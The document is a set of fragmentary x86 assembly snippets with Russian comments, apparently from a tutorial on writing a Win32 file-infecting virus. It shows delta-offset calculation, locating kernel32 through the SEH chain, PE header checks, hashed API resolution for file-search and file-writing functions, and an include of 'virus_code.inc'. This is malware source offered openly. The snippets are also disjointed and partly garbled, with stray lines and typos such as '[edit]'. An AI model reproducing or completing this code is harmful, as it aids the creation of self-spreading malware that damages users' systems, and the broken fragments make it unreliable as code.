typedef struct _IMAGE_NT_HEADERS {
    DWORD Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER32 OptionalHeader;
}
сall  VirDelta
VirDelta:
    sub   dword ptr [esp], OFFSET VirDelta
    push  dword ptr [esp]
or edx, edx ; edx = 0
    assume fs:flat
    mov eax, fs:[edx]
    dec edx             
 edx = 0FFFFFFFFh
 cmp    [eax], edx            
    je     CheckKernel32         
    mov    eax, [eax]            
    jmp    SearchKernel32    
     mov    eax, [eax + 4]   
    xor ax, ax     
    cmp word ptr [eax], 5A4Dh
    je  CheckKernelMZ 
    mov  edx, [eax + 3Ch]
    cmp  word ptr [eax + edx], 4550h
    jne  _Exit
    dd 0F867A91Eh ; CloseHandle
dd 03165E506h ; FindFirstFileA
dd 0CA920AD8h ; FindNextFileA
dd 0860B38BCh ; CreateFileA
dd 029C4EF46h ; ReadFile
dd 0CC17506Ch ; GlobalAlloc
dd 0AAC2523Eh ; GetFileSize
dd 07F3545C6h ; SetFilePointer
dd 0F67B91BAh ; WriteFile
dd 03FE8FED4h ; GlobalFree
dd 015F8EF80h ; VirtualProtect
dd 0D66358ECh ; ExitProcess
dd 05D7574B6h ; GetProcAddress
dd 071E40722h ; LoadLibraryA
dd 0E65B28ACh ; FindClose
dd 059B44650h ; GetModuleFileNameA
dd 00709DC94h ; SetCurrentDirectoryA
dd 0D64B001Eh ; FreeLibrary
dw 0FFFFh     ;
  mov   esi, [eax + edx + 78h]
    add   esi, eax
    add   esi, 18h
    xchg  eax, ebx
    lodsd
     push  eax
      lodsd
      push  eax
      lodsd
       push  eax                       ; [ebp+4*2]
    add   eax, ebx
    push  eax                       ; Указатель на таблицу имен 
                                    ; [ebp+4*1]
    lodsd                           ; получим RVA на таблицу ординалов
    push  eax                       ; [ebp]
    mov   edi, [esp+4*5]            ; edi = дельта_смещение
    lea   edi, [edi+HashTable]      ; edi указывает на начало HashTable
    mov   ebp, esp                  ; сохраняем базу стека

_BeginSearch:
    mov   ecx, [ebp+4*4]            ; число имен функций
    xor   edx, edx                  ; здесь хранится порядковый номер 
                                    ; функции (от 0)

_SearchAPIName:          
    mov  esi, [ebp+4*1]
    mov  esi, [esi]
    add  esi, ebx                   ; адрес ASСII-имени очередной API-
                                    ; функции

; подсчет хэш-значения от имени функции
_GetHash:
    xor  eax, eax
    push eax
_CalcHash:
    ror  eax, 7
    xor  [esp],eax
    lodsb
    test al, al
    jnz  _CalcHash
    pop  eax
OkHash:
    cmp  eax, [edit]
    je   _OkAPI
    add  dword ptr [ebp+4*1], 4
    inc  edx
    loop _SearchAPIName 
    jmp  _Exit                            
_OkAPI:
    shl  edx, 1                     
    mov  ecx, [ebp]                 
    add  ecx, ebx
    add  ecx, edx
    mov  ecx, [ecx]
    and  ecx, 0FFFFh
    mov  edx, [ebp+4*3]
    add  edx, ebx
    shl  ecx, 2
    add  edx, ecx
    mov  edx, [edx]
    add  edx, ebx
    push edx                        
    cmp  word ptr [edi+4], 0FFFFh   
    je   _Call_API
    add  edi, 4                     
    mov  ecx, [ebp+4*2]             
    add  ecx, ebx
    mov  [ebp+4*1], ecx         
    jmp  short _BeginSearch
    CloseHandle         equ dword ptr [ebp-4*1]
FindFirstFileA      equ dword ptr [ebp-4*2]
FindNextFileA       equ dword ptr [ebp-4*3]
CreateFileA         equ dword ptr [ebp-4*4]
ReadFile            equ dword ptr [ebp-4*5]
GlobalAlloc         equ dword ptr [ebp-4*6]
GetFileSize         equ dword ptr [ebp-4*7]
SetFilePointer      equ dword ptr [ebp-4*8]
WriteFile           equ dword ptr [ebp-4*9]
GlobalFree          equ dword ptr [ebp-4*10]
VirtualProtect      equ dword ptr [ebp-4*11]
_ExitProcess        equ dword ptr [ebp-4*12]
GetProcAddress      equ dword ptr [ebp-4*13]
LoadLibrary         equ dword ptr [ebp-4*14]
FindClose           equ dword ptr [ebp-4*15]
GetModuleFileNameA  equ dword ptr [ebp-4*16]
SetCurrentDirectoryA equ dword ptr [ebp-4*17]
FreeLibrary         equ dword ptr [ebp-4*18]
.386
.model flat, stdcall
option casemap:none
pushz macro szText:VARARG
    local nexti
    call  nexti
    db    szText, 0
nexti:
endm
includelib lib\kernel32.lib
ExitProcess PROTO :DWORD
.data
db 0
.code
invoke ExitProcess, 0
start:
include inc\start_code.inc
include inc\virus_code.inc
include inc\data.inc
end start
pushz “user32.dll”
call  LoadLibrary
